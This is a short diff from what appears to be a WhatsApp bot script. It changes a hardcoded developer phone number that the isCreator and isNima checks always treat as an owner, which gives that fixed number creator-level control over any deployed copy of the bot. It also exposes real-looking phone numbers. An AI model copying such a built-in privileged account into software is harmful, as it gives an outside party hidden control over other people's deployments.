@@ -137,7 +137,7 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await ElisaBotMd.decodeJid(ElisaBotMd.user.id)
-    	const nimanumber = "94719574492"
+    	const nimanumber = "94715166712"
         const isCreator = [botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isNima = m.sender == "94715166712@s.whatsapp.net" ? true : false
         const itsMe = m.sender == botNumber ? true : false
